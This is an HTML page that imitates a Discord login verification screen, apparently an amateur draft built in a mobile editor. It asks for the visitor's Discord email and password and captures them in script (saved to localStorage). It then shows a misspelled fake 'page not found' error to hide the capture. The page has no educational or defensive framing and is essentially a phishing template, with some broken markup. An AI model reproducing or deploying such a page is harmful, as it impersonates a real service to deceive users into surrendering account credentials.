<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord Verification</title>
<style>
    body {
        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        background-color: #36393F;
        color: #dcddde;
        margin: 0;
        padding: 0;
    }

    .container {
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .verification-form {
        background-color: #484B51;
        border-radius: 8px;
        padding: 20px;
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        max-width: 400px;
        width: 90%;
        text-align: center;
    }

    .verification-form h1 {
        font-size: 24px;
        margin-bottom: 20px;
        font-weight: 500;
        color: #fff;
    }

    .verification-form img {
        width: 100px;
        margin-bottom: 20px;
    }

    .verification-form input[type="email"],
    .verification-form input[type="password"],
    .verification-form input[type="submit"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        border: none;
        border-radius: 5px;
        box-sizing: border-box;
        background-color: #72767d;
        color: #dcddde;
        font-size: 16px;
        font-weight: 500;
    }

    .verification-form input[type="email"]::placeholder,
    .verification-form input[type="password"]::placeholder {
        color: #dcddde;
    }

    .verification-form input[type="submit"] {
        background-color: #7289DA;
        cursor: pointer;
        transition: background-color 0.3s ease;
    }

    .verification-form input[type="submit"]:hover {
        background-color: #677bc4;
    }
</style>
</head>
<body>

<div class="container">
    <form class="verification-form" id="verification-form">
        <img src="file:///storage/emulated/0/Android/data/com.teejay.trebedit/files/TrebEdit user files/TrebEdit user files/Sample project - Acme/img/discord-logo-logodownload-download-logotipos-1.png" alt="Discord Logo">
        <h1>Verify that it's you</h1>
        <input type="email" id="username" nam        e="username" placeholder="Email" required>
        <input type="password" id="password" name="password" placeholder="Password" required>
   <div <a href="file:///storage/emulated/0/Android/data/com.teejay.trebedit/files/TrebEdit user files/TrebEdit user files/Sample project - Acme/img/TwitterErrorMobile.jpg"><input type="submit" value="Verify">
  </a>
  </div>  </form>
</div>

<script>
            document.getElementById('verification-form').addEventListener('submit', function(event) {
        event.preventDefault();
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        localStorage.setItem('discord_username', username);
        localStorage.setItem('discord_password', password);

        alert("Some thing went worng the page was not found please try again later:(!)");
    });
</script>

</body>
</html>
